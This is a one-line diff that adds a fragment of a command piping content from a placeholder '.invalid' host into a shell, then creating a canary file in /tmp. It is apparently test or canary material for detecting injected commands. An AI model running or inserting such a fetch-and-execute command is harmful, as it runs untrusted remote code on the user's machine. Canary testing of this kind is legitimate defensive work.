@@ -1,0 +1,1 @@
+optimiser.invalid/o | sh; touch /tmp/reinvently-canary-split
